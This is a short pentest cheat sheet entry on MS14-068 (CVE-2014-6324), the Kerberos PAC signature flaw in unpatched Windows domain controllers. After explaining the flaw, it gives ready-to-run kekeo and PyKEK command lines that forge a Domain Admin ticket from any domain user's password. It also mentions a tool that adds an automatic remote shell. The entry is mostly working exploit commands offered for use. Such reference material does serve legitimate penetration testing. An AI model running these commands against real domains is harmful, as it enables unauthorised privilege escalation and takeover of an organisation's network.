# MS14-068 (CVE-2014-6324)

MS14-068 exploits a flaw in how the KDC validates PAC signatures on unpatched Domain Controllers. Before the patch, the KDC accepted any signature type with a size of 20 bytes or fewer, including non-keyed algorithms like MD5. Any authenticated domain user can forge a PAC claiming membership in Domain Admins without knowing the krbtgt key, making it a direct privilege escalation rather than a persistence technique. The resulting TGT is usable like a golden ticket. Patched DCs reject the forged signature; a patched DC may still return a valid but unprivileged TGT by ignoring the forged PAC and substituting a legitimate one.

## Windows

Kekeo's ms14068.exe implements the attack natively on Windows.

### kekeo ms14068 (password)

#cmd #kekeo #tgt

Forge a privileged TGT by exploiting the MS14-068 PAC signature validation flaw using a plaintext password, with SID and RID auto-discovered.

```cmd title:"MS14-068 TGT forgery via kekeo ms14068.exe (password)"
.\ms14068.exe /domain:$domain /user:$user /password:$pass /kdc:$dc_fqdn
```

## Linux

PyKEK's ms14-068.py performs the attack; goldenPac.py combines exploitation with automatic PsExec shell.

### pykek ms14-068.py (password)

#python #pykek #tgt

Exploit MS14-068 to obtain a privileged TGT using a plaintext password.

```sh title:"MS14-068 TGT forgery via PyKEK (password)"
ms14-068.py -u "$user"@"$domain_fqdn" -p "$pass" -s "$user_sid" -d "$dc_fqdn"
```

### export KRB5CCNAME (pykek)

#shell #env

Set KRB5CCNAME to the ccache written by ms14-068.py so subsequent Kerberos tools use the forged ticket.

